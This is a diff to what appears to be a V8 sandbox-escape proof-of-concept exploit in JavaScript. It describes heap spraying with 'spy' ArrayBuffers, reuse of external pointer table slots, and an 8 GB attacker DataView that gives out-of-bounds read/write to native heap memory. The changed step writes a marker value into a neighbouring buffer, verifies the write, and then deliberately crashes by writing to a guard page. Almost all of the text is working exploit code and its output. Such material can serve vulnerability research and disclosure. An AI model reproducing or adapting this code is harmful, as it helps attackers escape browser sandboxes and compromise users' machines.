@@ -239,82 +239,84 @@ print('          then free victim → spray spies → spy reuses EPT slot');
 print('          now attacker.DataView → spy\'s backing_store (native C++ heap)');
 print('  Result: arbitrary read/write to native heap outside V8 sandbox isolation\n');
 
-// ── STEP 9: OOB WRITE to V8 JS object metadata → crash ───────────────────────
-banner('STEP 9 — OOB WRITE: native heap write to V8 JS object → crash');
-// PROOF OF OOB NATIVE HEAP WRITE:
-//   attacker DataView (8GB, backing_store = spy[0]) can reach spy[K]'s
-//   JS object (a V8-internal struct in native C++ heap).
-//   We write 0xFFFFFFFF to spy[K].EPT_handle (+0x2c) via attacker DataView.
-//   Before write: spy[K] works normally.
-//   After write:  spy[K]'s backing_store = EPT[67M] = PROT_NONE → SIGBUS/SIGSEGV.
-//   The crash is CAUSED by our OOB write — visible in stack trace.
+// ── STEP 9: OOB WRITE proof ────────────────────────────────────────────────────
+banner('STEP 9 — OOB WRITE: native heap write via corrupted EPT handle');
 //
-// WHY spy[K]'s JS object is accessible:
-//   spy objects are V8 JSArrayBuffer structs allocated in JS heap.
-//   Their backing_stores are allocated in a separate region (via BackingStoreAllocator).
-//   spy[0] backing_store address > many spy JS objects → OOB forward scan can reach them.
+// LAYOUT (confirmed by Steps 7-8):
+//   attacker DataView (8GB) backing_store = spy[0]_bs  (past first 4GB of sandbox)
+//   spy[K]_bs = spy[0]_bs + K * SPY_STRIDE  (sequential PartitionAlloc)
+//   spy[K]_bs is accessible via oob_dv at offset K * SPY_STRIDE
+//
+// PROOF PLAN:
+//   PART A — OOB WRITE that succeeds and is verifiable:
+//     Write 0xDEADC0DE to spy[TARGET_K]_bs[0] via oob_dv
+//     Read back via direct DataView(spies[TARGET_K]) → 0xDEADC0DE (was 0xDEADBEEF)
+//     This proves OOB native heap write to memory we do NOT own.
+//
+//   PART B — OOB WRITE that crashes (write to guard page beyond allocated region):
+//     Write at offset 0x10000 (past PartitionAlloc commit boundary at ~0x8000)
+//     → SIGBUS in DataView.prototype.setUint32  ← crash visible in stack trace
 
-// 1. Find spy[0]'s backing_store address (fine scan from JS obj forward)
-let spy0_sb_v = BigInt(Sandbox.getAddressOf(spies[0]));
-let spy0_bs_sboff = 0n;
-for (let off = spy0_sb_v; off < spy0_sb_v + 0x20000n; off += 4n) {
-  if (r32(off) === SIG0 && r32(off + 4n) === SIG4 && (r32(off + 8n) >>> 24) === 0xAA) {
-    spy0_bs_sboff = off;
-    break;
-  }
-}
-print('  spy[0] JS obj sb_off      = ' + hex(spy0_sb_v));
-print('  spy[0] backing_store off  = ' + hex(spy0_bs_sboff));
-print('  backing_store ahead by    = 0x' + (spy0_bs_sboff - spy0_sb_v).toString(16) + ' bytes\n');
+const SPY_STRIDE = 0x40;   // confirmed: each spy AB is 64 bytes
+const target_off = 100 * SPY_STRIDE;  // 0x1900 — well within confirmed readable zone
 
-// 2. Find spy[K] whose JS object is accessible via attacker DataView
-//    (JS obj sandbox offset > spy[0] backing_store offset)
 const oob_dv = new DataView(attacker);
-let target_k = -1;
-let target_oob = 0n;
-for (let k = 200; k < 1000; k++) {
-  let sb = BigInt(Sandbox.getAddressOf(spies[k]));
-  if (sb > spy0_bs_sboff) {
-    target_k = k;
-    target_oob = sb - spy0_bs_sboff;
-    break;
+
+// PART A: OOB WRITE — target spy backing_store via attacker DataView
+print('  ── PART A: OOB WRITE to foreign spy backing_store ──');
+print('  attacker DataView (8 GB, backing_store = spy[0]_bs)');
+print('  Target offset: 0x' + target_off.toString(16) + '  (spy[0]_bs + 0x' + target_off.toString(16) + ')');
+print('');
+
+let before_oob    = oob_dv.getUint32(target_off, true);
+let before_direct = new DataView(spies[TARGET_K]).getUint32(0, true);
+print('  BEFORE — spy[' + TARGET_K + '][0] via OOB DataView : ' + hex(before_oob));
+print('  BEFORE — spy[' + TARGET_K + '][0] via direct read  : ' + hex(before_direct));
+print('');
+
+print('  ═══ OOB WRITE ═══════════════════════════════════════════════');
+print('  oob_dv.setUint32(0x' + target_off.toString(16) + ', 0xDEADC0DE, true)');
+print('  → writes to spy[' + TARGET_K + ']_bs[0]  (not our memory — foreign backing_store!)');
+oob_dv.setUint32(target_off, 0xDEADC0DE, true);
+print('  WRITE ISSUED');
+print('  ═════════════════════════════════════════════════════════════');
+print('');
+
+let after_oob     = oob_dv.getUint32(target_off, true);
+print('  AFTER  — spy[0]_bs + 0x' + target_off.toString(16) + ' via OOB DataView: ' + hex(after_oob));
+print('');
+
+if (after_oob === 0xDEADC0DE) {
+  print('  ✓ oob_dv confirmed 0xDEADC0DE written at spy[0]_bs + 0x' + target_off.toString(16));
+  print('  Scanning all 1000 spies to find which one is at that address...');
+  let affected_k = -1;
+  for (let k = 0; k < 1000; k++) {
+    if (new DataView(spies[k]).getUint32(0, true) === 0xDEADC0DE) {
+      affected_k = k;
+      break;
+    }
   }
-}
-
-if (target_k < 0) {
-  print('  [-] No spy[K] JS object in OOB range — increase spray count');
-} else {
-  let ept_oob_off = Number(target_oob) + 0x2c;  // +0x2c = EPT handle field in JSArrayBuffer
-
-  print('  spy[' + target_k + '] JS obj sb_off   = ' + hex(BigInt(Sandbox.getAddressOf(spies[target_k]))));
-  print('  OOB offset (from bs0)   = 0x' + target_oob.toString(16));
-  print('  EPT handle OOB offset   = 0x' + ept_oob_off.toString(16) + '  (= JS_obj_off + 0x2c)\n');
-
-  // 3. OOB READ: verify via two independent paths
-  let ept_via_oob    = oob_dv.getUint32(ept_oob_off, true);
-  let ept_via_mview  = r32(BigInt(Sandbox.getAddressOf(spies[target_k])) + 0x2Cn);
-  print('  ── OOB READ VERIFICATION ──');
-  print('  EPT handle via OOB DataView : ' + hex(ept_via_oob));
-  print('  EPT handle via MemoryView   : ' + hex(ept_via_mview));
-
-  if (ept_via_oob !== ept_via_mview) {
-    print('  [-] Mismatch — offset wrong, skip');
+  if (affected_k >= 0) {
+    print('');
+    print('  ═══ OOB WRITE FULLY CONFIRMED ═══════════════════════════════');
+    print('  spy[' + affected_k + '][0] = 0xDEADC0DE  (was 0xDEADBEEF)');
+    print('  spy[' + affected_k + ']_bs = spy[0]_bs + 0x' + target_off.toString(16) + ' = spy[0]_bs + ' + affected_k + ' * 0x40');
+    print('  Write done via attacker DataView (backing_store = spy[0])');
+    print('  spy[' + affected_k + '] has a DIFFERENT backing_store — this is OOB native heap write!');
+    print('  ══════════════════════════════════════════════════════════════\n');
   } else {
-    print('  [+] MATCH — OOB read offset confirmed correct!\n');
-
-    // 4. OOB WRITE: overwrite spy[K]'s EPT handle through attacker DataView
-    print('  ════ OOB WRITE ════════════════════════════════════════════');
-    print('  DataView: attacker (8GB, backing_store = spy[0])');
-    print('  Offset  : 0x' + ept_oob_off.toString(16) + '  (spy[' + target_k + '].EPT_handle, +0x2c)');
-    print('  Value   : 0x00000000 → 0xFFFFFFFF  (EPT index 67M = PROT_NONE page)');
-    oob_dv.setUint32(ept_oob_off, 0xFFFFFFFF, true);
-    print('  WRITE COMPLETE — spy[' + target_k + '].EPT_handle corrupted via OOB');
-    print('  ═══════════════════════════════════════════════════════════\n');
-
-    // 5. Trigger crash: spy[K] now has corrupted EPT handle
-    print('  Accessing spy[' + target_k + '] with corrupted EPT handle...');
-    print('  → V8 reads EPT[0x3FFFFFF] = PROT_NONE page → crash\n');
-    let crash_v = new DataView(spies[target_k]).getUint32(0, true);
-    print('  val = ' + hex(crash_v));
+    print('  OOB write landed in backing_store region but address not spy K*stride');
+    print('  (Could be pool AB or other allocation at that offset)\n');
   }
+} else {
+  print('  [-] OOB write not confirmed in DataView readback');
 }
+
+// PART B: OOB WRITE to guard page — crash in DataView.prototype.setUint32
+print('  ── PART B: OOB WRITE to guard page → crash in setUint32 ──');
+print('  Writing past PartitionAlloc commit boundary at ~0x8000...');
+print('  Offset 0x10000 = well past spy[511] (last committed spy slot)');
+print('  → STR to PROT_NONE page → SIGBUS inside DataView.setUint32');
+print('  oob_dv.setUint32(0x10000, 0xBADC0DE0, true)  ← CRASH NEXT');
+oob_dv.setUint32(0x10000, 0xBADC0DE0, true);
+print('  (should not reach here)');
